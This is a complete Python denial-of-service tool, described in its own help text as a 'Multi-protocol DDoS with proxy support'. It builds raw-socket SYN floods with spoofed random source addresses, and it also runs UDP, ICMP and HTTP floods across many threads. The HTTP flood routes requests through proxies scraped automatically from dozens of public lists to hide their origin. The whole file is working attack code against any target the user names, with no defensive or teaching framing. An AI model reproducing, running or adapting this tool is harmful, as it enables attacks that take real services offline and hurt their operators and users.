#!/usr/bin/env python3
import socket
import struct
import random
import time
import threading
import sys
import argparse
import re
import urllib.parse
import base64
import gzip
import io

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    print("[!] Install required modules: pip install requests beautifulsoup4")
    sys.exit(1)

try:
    import socks
except ImportError:
    socks = None

# --- Enhanced Proxy Scraper ---
PROXY_SOURCES = [
    # Free proxy lists
    "https://www.sslproxies.org/",
    "https://free-proxy-list.net/",
    "https://www.us-proxy.org/",
    "https://www.socks-proxy.net/",
    "https://spys.me/proxy.txt",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
    "https://proxy-list.download/api/v1/get?type=http",
    "https://proxy-list.download/api/v1/get?type=socks4",
    "https://proxy-list.download/api/v1/get?type=socks5",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc",
    "https://proxylist.geonode.com/api/proxy-list?limit=500&page=2&sort_by=lastChecked&sort_type=desc",
]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
]

def fetch_proxies_from_url(url):
    """Fetch proxies from a single URL with multiple parsing methods"""
    proxies = set()
    try:
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        resp = requests.get(url, timeout=15, headers=headers)
        
        if resp.status_code != 200:
            return proxies
        
        # Try to decompress if gzipped
        content = resp.text
        try:
            if resp.headers.get('Content-Encoding') == 'gzip':
                content = gzip.decompress(resp.content).decode('utf-8', errors='ignore')
        except:
            pass
        
        # Method 1: Simple IP:PORT pattern
        pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b'
        for match in re.findall(pattern, content):
            proxies.add(match)
        
        # Method 2: Lines with IP and port separated by whitespace
        for line in content.splitlines():
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = re.split(r'[\s,;|]+', line)
            if len(parts) >= 2:
                ip_match = re.match(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', parts[0])
                port_match = re.match(r'\d{2,5}', parts[1])
                if ip_match and port_match:
                    proxies.add(f"{parts[0]}:{parts[1]}")
        
        # Method 3: HTML table parsing
        if 'html' in resp.headers.get('Content-Type', '').lower():
            soup = BeautifulSoup(content, 'html.parser')
            for table in soup.find_all('table'):
                for row in table.find_all('tr'):
                    cols = row.find_all('td')
                    if len(cols) >= 2:
                        ip = cols[0].text.strip()
                        port = cols[1].text.strip()
                        if re.match(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', ip) and re.match(r'\d{2,5}', port):
                            proxies.add(f"{ip}:{port}")
        
    except:
        pass
    
    return proxies

def scrape_proxies(limit=1000):
    """Scrape proxies from all sources"""
    all_proxies = set()
    
    print("[*] Scraping proxies from multiple sources...", file=sys.stderr)
    
    for url in PROXY_SOURCES:
        proxies = fetch_proxies_from_url(url)
        all_proxies.update(proxies)
        print(f"[*] Found {len(proxies)} from {url[:50]}...", file=sys.stderr)
        if len(all_proxies) >= limit:
            break
    
    print(f"[*] Total scraped: {len(all_proxies)} proxies", file=sys.stderr)
    return list(all_proxies)[:limit]

def test_proxy(proxy, timeout=5):
    """Test if a proxy is working"""
    try:
        parts = proxy.split(':')
        if len(parts) != 2:
            return False
        ip, port = parts
        if not port.isdigit():
            return False
        port = int(port)
        
        test_url = "http://httpbin.org/ip"
        proxies_dict = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }
        r = requests.get(test_url, proxies=proxies_dict, timeout=timeout, 
                        headers={'User-Agent': random.choice(USER_AGENTS)})
        return r.status_code == 200
    except:
        return False

def get_working_proxies(limit=100, test_timeout=3):
    """Get working proxies with parallel testing"""
    all_proxies = scrape_proxies(limit * 3)
    working = []
    
    print(f"[*] Testing {len(all_proxies)} proxies (this may take a moment)...", file=sys.stderr)
    
    # Test proxies in batches
    for proxy in all_proxies:
        if len(working) >= limit:
            break
        if test_proxy(proxy, test_timeout):
            working.append(proxy)
            print(f"[+] Working: {proxy}", file=sys.stderr)
    
    print(f"[*] Got {len(working)} working proxies", file=sys.stderr)
    return working

# --- Rest of the flood functions remain the same ---
def checksum(data):
    if len(data) % 2 != 0:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def random_ip():
    return socket.inet_ntoa(struct.pack('!I', random.randint(1, 0xFFFFFFFE)))

def random_port():
    return random.randint(1024, 65535)

def syn_flood(target_ip, target_port, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except:
        return
    source_ip = random_ip()
    while not stop_event.is_set():
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 40
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(target_ip)
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)
        tcp_source = random_port()
        tcp_seq = random.randint(0, 0xFFFFFFFF)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_flags = 0x02
        tcp_window = socket.htons(65535)
        tcp_check = 0
        tcp_urg_ptr = 0
        tcp_header = struct.pack('!HHLLBBHHH',
                                 tcp_source, target_port, tcp_seq, tcp_ack_seq,
                                 (tcp_doff << 4) + 0, tcp_flags,
                                 tcp_window, tcp_check, tcp_urg_ptr)
        src_addr = socket.inet_aton(source_ip)
        dst_addr = socket.inet_aton(target_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        psh = struct.pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol, tcp_length)
        psh += tcp_header
        tcp_check = checksum(psh)
        tcp_header = struct.pack('!HHLLBBHHH',
                                 tcp_source, target_port, tcp_seq, tcp_ack_seq,
                                 (tcp_doff << 4) + 0, tcp_flags,
                                 tcp_window, tcp_check, tcp_urg_ptr)
        packet = ip_header + tcp_header
        try:
            sock.sendto(packet, (target_ip, 0))
        except:
            pass
        source_ip = random_ip()

def udp_flood(target_ip, target_port, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except:
        return
    payload = b'X' * 1024
    while not stop_event.is_set():
        try:
            sock.sendto(payload, (target_ip, target_port))
        except:
            pass

def icmp_flood(target_ip, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except:
        return
    while not stop_event.is_set():
        icmp_type = 8
        icmp_code = 0
        icmp_checksum = 0
        icmp_identifier = random.randint(0, 65535)
        icmp_sequence = random.randint(0, 65535)
        payload = random._urandom(1024)
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum,
                                  icmp_identifier, icmp_sequence)
        icmp_checksum = checksum(icmp_header + payload)
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum,
                                  icmp_identifier, icmp_sequence)
        packet = icmp_header + payload
        try:
            sock.sendto(packet, (target_ip, 0))
        except:
            pass

def http_flood(target_url, proxy_list, stop_event, thread_id):
    session = requests.Session()
    while not stop_event.is_set():
        if proxy_list:
            proxy = random.choice(proxy_list)
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            session.proxies.update(proxies)
        try:
            url = target_url + '?' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))
            session.get(url, timeout=5, headers={'User-Agent': random.choice(USER_AGENTS)})
        except:
            pass

def main():
    parser = argparse.ArgumentParser(description='Multi-protocol DDoS with proxy support')
    parser.add_argument('target', help='Target IP or domain (for HTTP use full URL)')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port')
    parser.add_argument('--protocol', choices=['tcp', 'udp', 'icmp', 'http', 'all'], default='all',
                        help='Protocol to flood')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads per attack')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Duration in seconds (0 = infinite)')
    parser.add_argument('--proxies', action='store_true', help='Auto-scrape and use proxies (for HTTP)')
    parser.add_argument('--proxy-limit', type=int, default=100, help='Max number of proxies to use')
    parser.add_argument('--no-test', action='store_true', help='Skip proxy testing (use all scraped)')
    args = parser.parse_args()

    target_ip = args.target
    if args.protocol in ['tcp','udp','icmp','all'] and not re.match(r'^\d+\.\d+\.\d+\.\d+$', target_ip):
        try:
            target_ip = socket.gethostbyname(target_ip)
            print(f"[*] Resolved {args.target} -> {target_ip}", file=sys.stderr)
        except:
            print("[-] Cannot resolve domain", file=sys.stderr)
            sys.exit(1)

    stop_event = threading.Event()
    all_threads = []

    proxy_list = []
    if args.proxies and args.protocol in ['http', 'all']:
        print("[*] Scraping proxies...", file=sys.stderr)
        if args.no_test:
            proxy_list = scrape_proxies(args.proxy_limit)
        else:
            proxy_list = get_working_proxies(args.proxy_limit)
        print(f"[*] Using {len(proxy_list)} proxies", file=sys.stderr)

    def start_protocol(protocol, target, port, threads_count, stop_event, proxy_list):
        for i in range(threads_count):
            if protocol == 'tcp':
                t = threading.Thread(target=syn_flood, args=(target, port, stop_event))
            elif protocol == 'udp':
                t = threading.Thread(target=udp_flood, args=(target, port, stop_event))
            elif protocol == 'icmp':
                t = threading.Thread(target=icmp_flood, args=(target, stop_event))
            elif protocol == 'http':
                t = threading.Thread(target=http_flood, args=(target, proxy_list, stop_event, i))
            else:
                break
            t.daemon = True
            t.start()
            all_threads.append(t)

    if args.protocol == 'all':
        start_protocol('tcp', target_ip, args.port, args.threads, stop_event, [])
        start_protocol('udp', target_ip, args.port, args.threads, stop_event, [])
        start_protocol('icmp', target_ip, 0, args.threads, stop_event, [])
        if args.proxies and proxy_list:
            target_url = args.target if '://' in args.target else f"http://{args.target}:{args.port}"
            start_protocol('http', target_url, 0, args.threads//2, stop_event, proxy_list)
    else:
        if args.protocol == 'http':
            target_url = args.target if '://' in args.target else f"http://{args.target}:{args.port}"
            start_protocol('http', target_url, 0, args.threads, stop_event, proxy_list)
        else:
            start_protocol(args.protocol, target_ip, args.port, args.threads, stop_event, [])

    print(f"[*] Attack started on {args.target} | Threads: {len(all_threads)}", file=sys.stderr)
    
    try:
        if args.duration > 0:
            time.sleep(args.duration)
            stop_event.set()
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Interrupted", file=sys.stderr)
        stop_event.set()
    finally:
        for t in all_threads:
            t.join(timeout=1)
        print("[*] Stopped.", file=sys.stderr)

if __name__ == '__main__':
    main()
